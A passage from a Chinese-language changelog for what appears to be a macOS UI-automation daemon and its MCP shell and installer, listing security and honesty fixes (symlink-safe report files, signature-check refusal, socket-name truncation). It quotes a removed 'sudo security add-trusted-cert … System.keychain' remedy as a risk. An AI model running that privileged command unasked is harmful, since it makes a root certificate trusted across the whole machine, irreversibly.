    找不到才回落 `public let version`。测试补一份"两份都在、instance 排前面"的树，
    读回 1.10.0 才算过。
  - `ProjectRegistry.removalVerdict` 在**文件整个不见**时回 `(answerable: true, removed: true)`：
    `load()` 把缺文件当成"还没注册"，那对读侧对，对写后回读是同一种撒谎的另一张脸（一次没落盘的写
    与一张被删掉的表都给出一样的形状），于是命令报"确认已删除"并退 0。现在缺文件与读不开走同一条
    不回答的路，CLI 回 exit 1 + `loadFailed`。用例：`testRemovalVerdictRefusesWhenTheFileIsGoneAfterTheWrite`。
- 另有一条复审指控被实测**推翻**：`glasspaned --state-dir relative/path --version` 并不会像它说的
  退 0——`--state-dir` 的绝对路径校验发生在解析循环里，两种参数顺序实测都退 64。记录在此，
  免得下一轮把同一条指控再当缺陷报一次。

- **首帧的像素格式从"假设默认值是 BGRA"改成显式声明 + 逐帧核对。** 这是把 macOS 13 那条流
  通路修好之后**才出现的**新风险：登记了帧输出，这条路第一次真的会收到缓冲，而下面的拷贝按
  单平面 BGRA 写、`SCStreamConfiguration.pixelFormat` 从来没被设置过（全仓 `grep pixelFormat`
  零命中）。默认值若不是 BGRA，抄出来是一张绿色/噪声图，带着一个看似真实的像素差进证据包——
  比修复前更坏，因为修复前至少是如实的"测不到"。现在三态分开说：没等到（才是超时）/
  格式不是这条路能转的（给出可查的 fourCC）/ 转不出来。同批把 `waitForFirstFrame` 的
  `nil` 一途拆掉，"等到了但转不出来"从此不再冒充计时抖动。
- **网关关停改为有顶，并删掉一条跑不到的"旧 Node 回落"。** `closeIdleConnections` 与
  `closeAllConnections` 都出自 Node v18.2.0，本包声明 `engines: >=18`，"只有其中一个"的运行时
  不存在——那条分支唯一会做的事就是把刚修好的在飞 `act` 再拆一次。真正的洞是另一边：一个永不
  变空闲的连接会让 `close()` 永远不落地，SIGTERM 后进程挂死。现在到
  `CALLER_VISIBLE_CEILING_MS`（50s，那一刻调用方早就收到 `GP_E_ENGINE_TIMEOUT` + "别重发"）
  仍关不掉，就先说一句"放弃了什么"再强拆。
- **两处我自己写的闸/报文被复审抓出来**：`--list-projects` 的拒绝报文里留着
  `"projects": []` 与 `"count": 0`（正是要消灭的那两个键）；`RegistryVerdictTests` 那条
  `exit(1)` 断言的切片一直切到文件尾，被后面八条别的 `exit(1)` 满足——"把拒绝改回 exit(0)"
  照样绿。两处都改成有界窗口 + 反向验红。
- **假 daemon 的拒绝也被钉住了。** 上一笔把 `makeDaemonBinary` 改成只认 `--version`，但没人
  钉住这个拒绝：它退化回有求必应，上面那批用例照样绿。现在三种非 `--version` 参数各自要求
  退出码 64、stdout 空、stderr 说 `unknown argument`。

这四条与上面 `--version` 那一批同属"下一版带上"。面 A 因关停/格式那两笔再长 +6 LOC
（8652 → 8658），同批 `--record`。

### Fixed — 面板（设置 / 控制台）

- **「确认清理」「删除这个项目」按下去没有结果（P0）。** `ConsoleModel.lastActionMessage`
  把每一种结局都算好了——删了几条、失败在哪、要不要重启——`ConsoleCliChannelTests` 还逐条测过
  它算得对不对，而**没有任何视图读它**（`git grep lastActionMessage -- engine` 只有声明一行加
  四处写入）。于是"确认清理"点下去只是关掉确认表，屏幕上不多一个字：消息算得越仔细、测试越绿，
  界面上就越安静。这一条正是本仓给 `gp-confirm-prune` 定过的那类 P0——控件指得到 daemon 真命令，
  却给不出任何可核对的结果。现在结论挂在控制台页签之外的一行里
  （`ConsoleRootView.actionOutcomeStrip`，标识 `gp-action-message`，带「关闭」）；`confirmPrune`
  也补上与另两个动作同形的 `guard canRunDaemonCLI`——从前它在读不到 daemon 程序路径时照样关掉
  确认表，把"没有可执行入口"演成"已经执行完了"。新增闸：`PanelActionReadoutTests`（扫面板模型里
  每一个 `@Published` 状态，逐个要求它有读者；注释先行剥除——把结论写在注释里不算有人读了它）。
  **这条闸是被自己的反向破坏修出来的**：第一轮变异只把横幅从视图树上摘掉，两条断言全绿——
  "读到过那个名字"与"它真被渲染出来"是两件事，于是补上挂点断言 `{ actionOutcomeStrip }`，
  同一变异才落成具名红。
- **「重启后台服务」不再凭空点亮。** `restartDaemon()` 从前是 `runSystemBinary` 里一句
  `try? process.run()`：不取退出码、不读 stderr，然后调用方无条件清掉 `pruneNeedsRestart`——
  kickstart 失败（作业没加载、标签不对）与重启成功在屏幕上长成同一个样子，而此刻面板正该说
  "注册表还没换新表"。现在 launchctl 的退出码与重启后 hello 报回的进程号一起折算成
  `DaemonRestartOutcome`，横幅只在实测到进程号换过时收起；每个失败分支自己给出下一步
  （`launchctl print gui/<uid>/com.glasspane.daemon`、再点一次、或手动退出重开），读不到回话
  按"没确认"处理，绝不折算成成功。新增闸：`DaemonRestartOutcomeTests`（`pidAfter: nil` 那一条
  不许回 `.confirmed`；launchctl 那一步与 pid 对照那一步分开判；每个失败文案必须含一个可执行动作，
  且指得到真实作业标签）。顺带让引擎里那句 `PermissionGuide.manualRestartHint` 第一次有了读者。
- **「打开报告」落盘的那份副本，权限与名字都不对，而 SECURITY 页写着它不存在。** 从前是一句
  `try? data.write(to: 临时目录/glasspane-evidence-<operationId>.html)`：模式由进程 umask 决定
  （`0644`——本机任意进程都能读被测应用的界面文本），名字人人可猜（谁先占住那个名字、包括放一个
  symlink，就照着写），而且它永远不落进 `~/.glasspane` 那套被收紧扫描覆盖的位置。SECURITY 双语
  同一节又写着"Nothing here writes a report copy"。现在落盘走
  `EvidenceReportGenerator.writePrivateHTMLReport`：`0600` + `O_EXCL | O_NOFOLLOW` + 每次写入随机名，
  并拒绝落进同组/其他人可写或不属于本用户的目录；写不成把原因和下一步交给动作横幅，写成也报出
  落在哪里（状态根之外，没人替你删）。SECURITY 双语那节按实测形态改写。新增闸：
  `ReportWriteIsolationTests`（0600 实测、字节数核回、预置 16 个 symlink 的抢占负例、0777 目录的
  拒绝分支、"合格目录必须放行"这条防一路拒绝）。

### Fixed — daemon 与 MCP 壳的同一句谎话

- **`GP_E_PROJECT_LIMIT` 的出路两层都在命令一件不存在的事。** daemon 侧（`ProtocolErrors.swift`）
  写着"这一面没有任何删除动作"，壳侧（`tools.ts`）更进一步，让 agent 去手改 `projects.json`——
  而 `main.swift` 自己写着手改的那一份会被运行中 daemon 的下一次写盘静默冲掉。两句都过期了：
  `--project-remove <id>` 与 `--project-prune` 自 1.7.0 起就在那张解析表里，而 `engine-client.ts`
  是把 daemon 的 remedy **逐字转达**的，所以同一个错误码从两层得到两句相反的话，恰好是 daemon
  那句在命令人做不存在的事。现在两侧都点名真实的删除命令、`--dry-run` 预览、未知 id 退 3，并说清
  "删除要重启才生效"（报文的 `requiresDaemonRestart`）与"不要手改那个文件"。新增闸：
  `mcp-shell/test/tools.test.mjs` 的 `the daemon's own project-limit remedy names the same removals`
  （把 daemon 源码里那段出路抠出来与壳侧对照，两层不许各说各话）。原有那条"引用的每个
  `glasspaned --flag` 都必须真被解析"继续生效；钉"不许出现 no delete"的那半改成了钉"必须出现真实
  删除命令、且不许出现手改文件"——**判据换方向是因为能力变了**，不是为了让它过，两侧都由变异验过
  能红（把 `--project-remove` 改成 daemon 不解析的 `--project-forget` ⇒ 两条具名红）。

### Fixed — 引擎（闸能红的那一类）

- **socket 名字超长时，那条写着"too long or invalid"的拒绝永远走不到。** 四个 bind/connect 点都是
  同一段：`strncpy` 拷进 `sun_path` 后检查"拷没拷成功"——`strncpy` 对超长输入**静默截断**并返回
  目标指针，那个检查于是恒为真。bind 那侧绑成一个截短的名字，随后 `chmod(0600)` 与 `unlink` 都打在
  调用方给的全名上双双 ENOENT（截短出来的套接字文件留在盘上）；connect 那侧报"没有监听者"而真名上
  确实有人。现在容量判定收进 `UnixSocketAddress`（长度按 `sun_path` 实测、含 NUL 的名字一并拒、
  写完读回比对槽里装的确实是那个名字），`SocketServer`/`ProbeSocketServer`/`DaemonProbe` 三处走它，
  探针包内那份加了同一判定。新增闸：`SocketPathCapacityTests` —— `testProbeServerRefusesANameThatDoesNotFit`
  是这条错误路径**第一次真的被走到**；变异验过：去掉读回比对 ⇒ 该条与 `testOverlongAndEmbeddedNulNames
  AreRefused` 双红，失败输出里那条被截到 104 字节的路径就是原缺陷本尊。`testNoProductionSite
  CopiesIntoSunPathByHand` 挡住下一个手搓拷贝的站点。
- **自动留存删掉的审计档案不再静默。** `write()` 成功后调 `pruneIfNeeded()` 与
  `pruneExpiredIfNeeded()`，两个都 `@discardableResult` 回"真删了几条"，两处调用点却都把数丢掉；
  于是 `EngineCore` 对着一次"存下这条、同时抹掉 N 条旧档"的操作报 `evidencePersisted: true`。
  同一条命令走 CLI（`--prune-evidence`）时是逐条报数的，两条路的诚实度不该不一样。现在按各自判据
  把条数与判据名（条数上限 / 按龄几天）写进日志，什么都没删就什么都不说。新增闸：
  `EvidenceRetentionNoticeTests`（含"删了 0 条不许出一句清理"的负例与一处结构闸；变异验过：把任一处
  改回丢弃返回值 ⇒ `testEveryRetentionCallUsesTheCountItGetsBack` 具名红）。
- **证据包的临时名不再共用。** `<entry>.json.tmp` 换成 `<entry>.json.tmp-<pid>-<uuid>`，与
  `ProjectRegistry` 同一个理由：这份档案柜有多个写者（daemon，以及对着同一个 `--state-dir` 跑的一次性
  CLI），共用临时名允许一个写者把另一个写者半开的缓冲 rename 到位；而 `.tmp` 结尾过不了
  `isEntryName`，`clear()`、两种 prune 与 `stats()` 都会把崩溃留下的那个当不存在。名字生成抽成
  `EvidenceStore.temporaryPath`（与既有 `isolationCheck` 同一类注入缝）：`StatePermissionTests`
  走到 fallback 拒绝分支的夹具靠的就是"一个已知的临时名上蹲着目录"。**两条既有断言同时被改强**：
  `EngineP1Batch6Tests` 与 `StatePermissionTests` 从前只查固定的 `<entry>.json.tmp` 那一个名字，
  随机名之后它们会绿着放过每一种残留形状——现在判据是"条目名的任何兄弟都不许在"。
  这一条没有行为级闸（跨进程撞名要两个真进程才露面），记在此处以免被当成已验证。

### Fixed — 安装器与更新器（各自那道挡不住的门）

- **安装器对"签名在、验不过"从告警继续改为停下。** 从前 `verified` 之外一律黄字"——继续安装"，
  然后照跑 `npm install`、`swift build` 并注册 launchd 作业；而 `classifyTagVerify` 明明把
  `invalid`（`gpg: BAD signature`、公钥对不上）与 `unsigned`/`unavailable`（只是缺证明）分开判。
  自动更新那一面对 `invalid` 是硬拒且 `--consent` 洗不掉（`updater/lib/check.js` 的门 8），两条路
  按两种诚实度处理同一件事，而安装是更不可逆的那条。判据抽成纯函数 `tagVerifyDecision`（埋在
  `main()` 里的那一段没有测试能指到），并且**安装器不认识的新判据一律拒**——把"没见过"当成
  "没签名"放过，等于每加一种失败模式就自动退回继续安装。新增闸：`installer/test/cli.test.mjs` 的
  `tagVerifyDecision: 只有缺证明才继续，签不上就停下`（三种判据各一条；拒签报文必须说清哪些不可逆的
  事没做、并给得出 `git tag -v` 与 `GLASSPANE_REF=` 两条下一步；四个未知判据全拒。变异验过：把
  `invalid` 分支改成 warn ⇒ 该条具名红）。
- **`--consent` 拼错不再被静默收下。** `parseArgs` 从前对值不作判定，任何字符串都进
  `flags.consents`，政策侧按 `consented.includes(kind)` 判——于是拼错一个字母的那一次什么都不批，
  而调用方以为自己已经批了。现在两种写法（`--consent <kind>` / `--consent=<kind>`）都只对
  `CONSENT_KINDS` 放行，其余按用法错误退出并把可用的三种说出来。新增闸：
  `updater/test/cli-options.test.mjs` 三条（6 个负例样本 + 一条真子进程：拒绝必须到达 stderr、
   stdout 不许吐 JSON、状态根里不许留文件。变异验过：撤掉那道 includes 判定 ⇒ 两条具名红）。

### 未修（记在这里，免得下一轮重复发现）

- 面板的项目预览仍用面板侧的 `LocalArchive.isTestResidue` 过滤，没走 daemon
  `--project-prune --dry-run`。daemon 那份 dry-run 报文**已经**带着需要的东西（`main.swift` 的
  `projects` 就是命中清单），缺的只是面板去用它。
- 安装器仍按 `process.env.HOME` 组 socket 与日志路径，而 daemon 的默认状态根来自
  `NSHomeDirectory()`（`StateRoot.swift` 自己写过它不吃 `$HOME` 覆盖），启动参数里只给
  `--socket-path` 不给 `--state-dir`。`HOME` 与账号 home 不一致时两者分裂。要修先得定
  "哪个根是 canonical"，属决策类，留给 owner。
- 一次性 launchd 脚本落 `NSTemporaryDirectory()` 前没有做属主/位判定（`SocketServer
  .prepareSocketDirectory` 那套），输出名含时钟派生的 nonce。
- 面板把 daemon `hello` 报的 `binaryPath` 原样交给 `launchctl submit` 执行；同 uid 的代码本来就能
  执行它，增量是责任上下文与登录会话，但没有把那个路径钉回安装器注册的 bundle。
- 证据详情页没有上下翻页（`ConsoleModel.selectedIndex` 那种"为翻页而存在却没人读"的东西本轮已删）；
  面板也不提供 snapshot/restore/audit_ui 等 daemon 能力的入口。GUI 增件需要登录 GUI 会话的 AX 验收，
  本轮无人值守做不到，故未动。

## [1.9.0] — 2026-10-08

版本判断：**按 minor 记**。1.6.2 那四条 patch 判据实测都没动——状态文件的字段一个没加没改
（`projects.json`、`update-state.json` 的字段原样）、daemon 退出码集合仍是 `{0,1,2,3,64,65}`
（本版两条新拒绝都落在已有的 1）、CLI 参数没增删（`--help` 里 30 条开关与解析表实测一一对称，
`scripts` 里没有一处只在一侧出现）、两个 npm 包的 `bin` 声明没变，也没有新增任何用户可见控制件。
按 minor 走的是 **1.8.0 自己定下的那条口径**：动了对外可见的契约内容就不塞进 patch。本版动了两处：

- `assert_element` 的结果里多了 `evidencePersisted`——与 `act` 已有的同一个键、同一句语义
  （`store()` 的落盘结论）。从前 `act` 转达这句话，`assert_element` 把它丢掉却照样报
  `evidenceId`，那是对外结果形状上的一处真实变化；
- 更新器 `probe-failed` 的 remedy 从一句可直接执行的 `sudo security add-trusted-cert …`
  改成把特权动作明确交回给人（同一段仍然点名工具，`ca-bundle.test.mjs` 里"必须点名修复办法"
  那条断言照旧绿）。remedy 在本产品里就是给调用方执行的命令（SECURITY.md §3 的口径），
  这条不该由一个 patch 悄悄改掉。

本版**没有**合并未发布的版本号：开工实测 `v1.8.2` 指向 fdabb83、`npm view glasspane-mcp version`
与 `npm view glasspane-install version` 都回 1.8.2、根 `package.json` 也是 1.8.2，三者对齐。
期间 origin 前进了三笔（90e73ff / a2a3a23 / 580be9a），实测 `git diff --name-only` 那三笔**全部
只碰 `harness/`**，与产品面零重叠；本轮改动在基于 origin/main=580be9a 的隔离工作树里做
（`/Volumes/Eng-Dev/.worktrees/gp-daily-20261008`，分支 `daily/main-20261008`），没有碰别人
的未提交批次。**发版凭据仍是 CI**：本机与 GitHub runner 的分工沿 1.8.2 的口径。

### Fixed — 证据与通道：三处"绿着却什么都没测"

- **macOS 13 的像素通道一次也没有测到过。** `SCKCapturer.snapViaStream` 把
  `StreamFrameBridge` 只交给了 `SCStream(delegate:)`——那个委托只收生命周期回调，**不收帧**；
  全仓 `grep addStreamOutput` 零命中，于是 `waitForFirstFrame()` 每回都把
  `captureTimeoutSeconds`（5s）烧完再回 nil，每次 act 在这条候选上付 5s × 窗口 × before/after，
  最终恒抛 `pixelCaptureDenied("SCStream first frame timed out…")`。诚实方向没错（测不到就说不测到），
  但这条通道自始至终没有产出过一个读数，而它是 `Package.swift` 那个 `.macOS(.v13)` 下唯一的像素路径。
  现在在 start 之前登记 `.screen` 帧输出，登记失败当场说"没挂上"，不许再伪装成一次超时。
  闸：`CaptureChannelShapeTests` 两条（登记必须早于等待、类型与队列参数在位、失败分支点名）。
  **macOS 13 上的真值仍属待真机复跑**——本仓的 SCK 诊断用例一直是 opt-in、默认 skip，
  运行时证据要真窗口与屏幕录制席位，CI 与本机都造不出来。
- **信号闸跑在真的状态根上。** `engine/.signal_smoke.py` 从前只点名 `--socket-path` /
  `--probe-socket-path`，**没有** `--state-dir`：daemon 于是把状态根解析成家目录默认根，启动扫描
  随之把**这台机器上的** `~/.glasspane` 收紧（根 →0700，`projects.json`、`approvals.json`、
  `installer-daemon.log` 与每一条证据档案 →0600），而文件头一直写着"隔离…不碰现网"。本轮基线
  真跑过一次，`~/.glasspane/engine.sock` 的 mtime 就停在那一分钟。这是唯一接进 CI 的冒烟，
  每台开发机、每次 push 都在动真状态。现在 socket 由被点名的根推导，另加两条只有"`--state-dir`
  确实传到子进程"才成立、撤掉就同时红的断言（根由脚本建的 0755 被 daemon 收紧成 0700；
  两个 socket 出现在那个根里）。同一棵树里的 `.t9_smoke.py` 早就这么跑，这道闸一直没采纳。
- **`assert_element` 把落盘结论丢了。** `store(pack)` 回的是 `Bool?`（`nil`＝没有档案存储这回事，
  `false`＝写了但没落到盘上）；`act` 早就按 R1-07 转达这句话，`assert_element` 却把返回值丢掉、
  照样报 `evidenceId`——写被拒（非 0700 目录、隔离不过、盘满）时调用方拿着一个重启后
  `GP_E_NO_EVIDENCE` 的 id，以为这条断言的证据已经存好了。补齐同一条出口，缺席仍是"未测"而非 `false`。

### Fixed — 一次性 CLI 的两处假清白

- **`--list-projects` 把读不开的注册表报成"什么都没注册"并退 0。** `ProjectRegistry.all` 在
  `loadFailed` 时是空的，而类型自己的注释就写着"check the flag before presenting this as
  'no projects registered'"；这条命令恰是 agent 被指来回答"注册了什么"的那一条（`mcp-shell`
  的 remedy 原文点名它）。损坏的 `projects.json` → stdout `[]` + 退出码 0 → 读者照空表重建登记，
  而真条目还在文件里。同一份文件在 `--project-prune` / `--project-remove` 那里是拒绝覆写的
  （§12.3.2），读侧不该比写侧更容易蒙混。
- **`--project-remove` 在写后读不回时报 `removed: true` 并退 0。** `gone = !verified.all.contains{…}`
  在 `verified.loadFailed` 时恒为真——`removed` 那句注释承诺的是"盘上现在真的没有它了"，
  实际报的是"我看不见盘"。`runProjectPrune` 对同一种状况 exit(1)，写侧两条命令不能一个拒、一个报喜。
- 两处判据都挪进 `ProjectRegistry.listing()` / `removalVerdict(projectId:)`（可单测），并用两条
  源码形状闸钉住 daemon 真的调了它们——否则"测过的判据"与"跑着的判据"又是两张皮。
  `RegistryVerdictTests` 里那条"合法空表 vs 读不开"与"盘上还有 vs 真没了 vs 读不回"三态对照
  都能红也能过：拒绝分支不是恒真，也不是够不着。

### Fixed — 状态根里第二份没人管的文件，与一条越权的 remedy

- **`~/.glasspane/update.log`。** 每日更新作业的 `StandardOutPath`/`StandardErrorPath`，由
  **launchd** 创建——与 `installer-daemon.log` 同一个来源（那一份本仓实测过：launchd 自己建时走
  进程 umask，0644）。这一份的具体模式本轮**没有在真机上重测**：重测要往这台机器注册一个真
  launchd 作业，那不是无人值守任务该做的动作；未重测的是"它今天确实是 0644"，不是"该不该管"。
  要管的内容是真的：它是更新器每次 check/apply 的输出，记的是这台机器装了什么、更新到哪一步、
  每一次拒绝的理由。daemon 的启动扫描管根目录、登记表、审批链、安装器日志与证据包，唯独不管它；
  `updater` 的 `fsutil` 把自己写的每个文件都收紧，唯独不建这个（写的人不是它）。两道一起补：
  注册前按 0600 建并读回（chmod 落不住＝**拒注册**，一次 `launchctl` 都不碰——这条拒绝分支有
  测试真走到）；名字进 daemon 被收紧的那张表。
  `installer-daemon.log` 那条"唯一不被覆盖的文件"从此不再成立。
  跨语言漂移闸由"核一个名字"改成核一张表（`installer/test/log-modes.test.mjs`），
  两侧各测：`StatePermissionTests` 两条（0644→0600 且字节不动；缺文件不顺手创建）、
  `updater/test/agent-log.test.mjs` 五条、`CaptureChannelShapeTests` 一条。
- **`probe-failed` 的 remedy 里那句 sudo。** 它写的是
  `sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain …`。
  remedy 是被当作命令消费的（`engine-client.ts` 转发、`tools.ts` 渲染），于是任何被注入的一轮
  都能照着它把一张根证书装成**全机**信任——比 SECURITY.md §2.8 那条反复权衡过的放宽大得多，
  而且是不可逆的。现在把 agent 侧那条无特权的出路（`NODE_EXTRA_CA_CERTS`）放在前面，
  系统钥匙串那条点名工具、写明"由人在终端执行的决定"。闸：`updater/test/remedy-surface.test.mjs`
  扫每条 remedy 的升权命令形状，负例里**留着**当年那一句原文——扫描器必须能拒绝它。

### Fixed — MCP 壳与网关：三处调用方拿不到答案

- **网关关停打断在飞的 `act`。** `close()` 走 `closeAllConnections()`，把**已经有请求在跑**的
  连接一起销毁。实测在发布产物上：一次尚未返回的 `POST /v1/tools/act` 回 `ECONNRESET`——没有状态码、
  没有 `{code,message,remedy}`，"do NOT re-issue `act`" 那句 remedy 永远送不到，而 daemon 那边
  手指还在用户屏幕上。现在只销毁空闲连接，并在关停期间持续回收"事后才变空闲"的那些。
- **超限报文的拒绝不可达。** `readBody` 在 `req.destroy()` 之后才 reject，于是
  `GP_HTTP_PAYLOAD_TOO_LARGE` + "shrink the request payload and retry" 对 100% 的超限请求都
  读不到（实测 300 KiB 的 POST 回连接重置）——调用方拿着一个"连接断了"去原样重发。现在停读不拆链。
- **两个入口对认不出的参数态度不一致。** `tools/call` 不带 `arguments` 是合法 MCP，壳却把它
  喂进 `strictObject` 校验，回 `GP_E_BAD_PARAMS … : Required`——remedy 指着一个发布 schema 里
  并不存在的 `required`，空路径还渲染成一句多余的 `": Required"`。网关入口则把 `--socket-pth`、
  `--prot`、裸位置参数**静默丢掉**，照旧桥接到它自己猜的那个根，而操作者以为点名了另一个 daemon
  （stdio 入口早就为此加了那条 `else { throw }`）。

### Fixed — 一条声称豁免、其实没豁免的计算

- `scripts/check-doc-links.mjs` 每份文档都算一个 `codeFences` 集合，然后**从来没人读它**。
  围栏内的相对链接一直是被检查的——那不是缺陷，是这条死计算把一个不存在的行为写进了读者的预期。
  删掉它，并在原位写明"安装片段里抄错的路径也是抄错的路径"。

### 同批记录

- `harness/tools/tool-surface.mjs` 的面 A 基线因本版 `mcp-shell/src` 的有意增长（+51 LOC：
  关停语义、停读不拆链、两个入口的入参态度）由 `--record` 重记，单独一条
  `chore(harness)` 提交。除此之外 `harness/` 与 `kernel/` 一字未改。
- 本轮审查提出但**未改**的产品面问题（含证据、面板、installer、bridge、workflows 各侧）记在
  本次任务汇报的"未修清单"，不在本版里悄悄做一半。
### Internal — fork 的内核依赖升 0.1.3，行为闸的比较对象补齐

`harness/glasspane-harness/script/kernel-conformance.mjs` 在不带 `--impl` 时是拿实现对它自己比
（`every(a => a === answers[0])`），恒真，而 CI 恰恰就是这么跑的——这条由并行泳道的尺子自检点破，
本批修掉：新增金样 `contracts/kernel-conformance.json` 钉每条 fixture 的答案摘要与判/拒身份，
fixture 自带期望的优先当 oracle，每行报告标 `[oracle+golden+impl×N]`，缺金样拒绝跑绿。
`iterate-kernel` 同时从 0.1.2 升到 0.1.3（0.1.3 才把转录契约 `evidence-decision.ok-01.json`
打进 tarball；不升，fork 侧的 oracle 分支拿到的是空集）。三把尺子随批重记，数字见 fork 的
`SYNCLOG.md`。判红口径未变：变的是"这道闸现在真的能红"。

### Internal — harness fork 的内核改为依赖，它的尺子跟着换

**判据没动**：本批全在 `harness/`（fork 的内核分发形态与量它的闸），`engine/`、`mcp-shell/`、
`installer/`、`updater/`、`bridge/` 与根版本线一个文件没碰。

- **fork 不再 vendored 共享内核。** `harness/glasspane-harness/packages/opencode/vendor/kernel/`
  （25 个文件）与镜像语料 `harness/contracts/kernel-fixtures/`（9 个文件，已经和发布出去的 11 个漂了）
  一起删除；`packages/opencode` 现在把 **`iterate-kernel@0.1.2`** 当普通依赖，从 registry 解析，
  `bun.lock` 记 integrity。换得动的前提是 kernel 侧先发了 0.1.2 并把 fixtures 打进 tarball（0.1.1
  一个没打，`npm pack` 实测）——在那之前 vendoring 是消费者唯一能握住契约字节的形态。
- **出处现在由 `harness/glasspane-harness/contracts/kernel-pin.json` 钉住**，`script/kernel-pin.mjs --check`
  验四件事：装进来的版本 == pin、`bun.lock` 那条 specifier 为空（＝registry 解析，不是 `file:`/`link:`）、
  lock integrity == pin、随包发出的 14 个契约文件（11 fixtures + 3 schemas）逐个 sha256 == pin；
  `--probe` 从 `git ls-remote` 改成问 registry。它替换的是 `kernel-vendor.mjs` + `kernel-vendor.json`。
  行为面另有一把：`script/kernel-conformance.mjs` 把随包语料跑过装进来的 `dist`，并把 fork 一直在消费、
  此前没有任何 fixture 校过的 `dimension-context` 纳进检查——实测 9 条 fixture 对 canonical 检出同答案，
  zod major 造成的报错文案差异由工具打印成 note。三处 CI 引用（fork `ci.yml`、根 `ci.yml`、
  `harness-contract.yml`）改到新闸。
- **顺手修掉一处"绿着却什么都没验"**：`test/tool/glasspane-kernel.test.ts` 按固定层数向上找出处清单，
  落在一个从来不存在的路径上，缺文件时只 `console.warn` 后 return。位置解析现收在
  `test/lib/kernel-contract.ts`（逐级上溯直到找到；缺 pin 即红）。
- **口径变化在两把尺子上可读**：`fork-diff` 重记为 `4668 identical / 259 edited / 81 added / 1705 deleted`
  （全树 6,713 个条目；上一记 `4669 / 258 / 114 / 1705`，6,746），少的 33 个 added 就是退役掉的 vendored
  树与它的旧尺子、加回 3 个新文件；`tool-surface` 面 B `5,548 → 5,376` 行（`14.89% → 14.50%`），面 A
  行数未变（比例 23.19% 随分母而动），**vendored 排除项 11 文件 / 1,464 行 → 0 文件 / 0 行**，金样另记
  `kernel: iterate-kernel@0.1.2`。`tools/sync-kernel.sh --target=fork` 改为明确拒绝并指向新的三步
  （bump 依赖 + `bun install` → `kernel-pin.mjs --record` → `kernel-conformance.mjs --impl <checkout>`）；
  `--target=repo`（mcp-shell 那份 `kernel/` 镜像）本批未动。单文件产物这条不变量重跑过：
  `script/build.ts --single --skip-install --skip-embed-web-ui` 编译并 boot smoke 通过（`0.7.0`）。

## [1.8.2] — 2026-10-06

版本判断：**按 patch 记**。四条判据都没动：状态文件的字段没加没改（`update-state.json` 的
`status` 闭集与 `code` 表原样）、daemon 退出码集合仍是 `{0,1,2,3,64,65}`、CLI 参数一个没增删
（`--help` 里那句改的是**说明文字**，不是开关）、两个 npm 包的 `bin` 声明没变，也没新增任何
用户可见控制件。本版是三处收口 + 一份"明确决定不做"的记录。

**发版凭据是 CI**（用户 2026-09-26 选定的口径）：本地这一批跑的时候，同一台机器上另一个会话的
harness 每日任务正把 load average 顶在 160–200，`npm test --workspaces` 里两条 mcp-shell
传输用例因此红成了"连接被拖到超时"（`GP_E_ENGINE_TIMEOUT`）而不是它们断言的"连不上"
（`GP_E_ENGINE_UNREACHABLE`），另有安装器一条端到端用例因预检被负载挤退而**按设计声明跳过**。
这三处都不是本版代码的形状（本版未触碰 `mcp-shell/src`），也**不许**用改判据或加超时去洗——
所以本地那两条红按"负载假红"记录，判定交给 GitHub 上干净的 runner。

### Fixed — 1.8.1 之后的 owner 授权批次（"全部你决定"）

- **`installer-daemon.log` 不再是"文档里承认没修"的那一个。** 写侧上一轮已改（安装器按 0600 建并读回
  比对，chmod 没落住按写失败报告），但**由 launchd 自己创建**的那一份仍走进程 umask（0644），而
  daemon 的启动扫描管根目录、登记表、审批链与证据包，唯独不管它，SECURITY.md 只能请人自己 `chmod`。
  现在它进了那张被扫的表：`StateRoot.installerDaemonLogFile` 定义在名字的唯一出处，
  `tightenPermissions` 一并收紧。真机实测（隔离状态根、debug daemon）：`644 → 600`、根 `755 → 700`，
  日志原有 15 字节一个没动——收紧是 `chmod`，不是重写。双语 SECURITY.md 已从"实测未修"改成这份实测
  口径，并保留那条真正的残余风险：**模式不随副本走**（复制到共享目录/同步盘/CI 制品后由目标位置说话）。
  跨语言漂移由 `installer/test/log-modes.test.mjs` 最后一条钉住：两侧名字必须同源，且那个名字必须真在
  被收紧的列表里——反向验红：把 `installerDaemonLogFile` 从列表里拿掉，Swift 侧
  `testTightenPermissionsBringsAPreExistingRootToOwnerOnly` 红、那条漂移闸也红（
  `这个名字必须真在被收紧的那张表里，而不是只定义了一个属性`）。
- **`glasspaned --help` 不再邀请一句误读。** `--permissions` 的说明从前写"the daemon's own permission
  snapshot"，而它测的是**本次调用进程**的席位；`ProtocolErrors` 那边明令不得把它读成 daemon 状态，
  帮助文本却正好在教人这么读。现在改成"this process's TCC seats"，并说清一次性调用测的不是在服务的
  那个 daemon、`subject` 段就是给人看这是谁的席位的。
- **删掉 `EngineCore.archiveDirectory(for:subject:)`。** 实测无任何调用方（`grep -rn "archiveDirectory("`
  只命中定义本身），而它那条"绝不回落到 `defaultDirectory` 去删 `~/.glasspane/evidence/`"的规矩，在真正
  会删东西的那条路上已由 `pruneEvidence` 的 `noStoreArchiveRefusal` 强制并注释在册（1706-1711）。
  留一份没人执行的守卫，只会让人以为这条不变量由它守着。

### 明确决定不做（同批记录，免得下一轮再问一遍）

- engine socket 的 peer 鉴权、probe socket 抢绑、ad-hoc 签名 DR 不含 cdhash、Developer ID + 公证：
  这四条是同一种性质——前两条是协议与信任模型的重设计（要同时改 daemon、壳、面板与三方消费者），
  后两条要一个付费的 Apple Developer 账号与 owner 的签名身份，都不是无人值守任务该替产品定的事。
- 面板一次性 CLI 不传 `--state-dir`：正解是让 daemon 在 `hello` 里回它实际用的状态根，那是对外契约
  的增量，与 §三处镜像同级，需 owner 定形状。
- 已推送的 `v1.8.0` tag 与对外的 GitHub Release 不删不移（本任务无权做不可逆的对外删除），
  只在那条 Release 的说明里加一行指向 1.8.1。

## [1.8.1] — 2026-10-06

版本判断：**按 patch 记**。判据仍是 1.6.2 那四条：状态文件的字段没动、退出码集合没动
（仍是 `{0,1,2,3,64,65}`）、CLI 参数没动、两个 npm 包的 `bin` 声明没动。本版内容全部是
1.8.0 的收口修复，不新增任何对外形状。

**为什么 registry 会从 1.7.0 直接跳到 1.8.1，而 1.8.0 在 npm 上根本不存在**：这不是漏发，
是有意跳过，与 1.5.1 / 1.5.2 那两次同一类决定（那两次的记录在 1.6.0 条目里）。`v1.8.0`
这个 tag 与它的 GitHub Release 是**先于**本轮 CI 结果发出的——`gh run view` 上 CI 的
`root workspace gate` 红了两条，而被打 tag 的那棵树（`5a86832`）里，安装器入口的五条退出
只改对了一条。macOS 用户也会撞上剩下那四条（`--help`、参数错误、`--restore-launchd`、
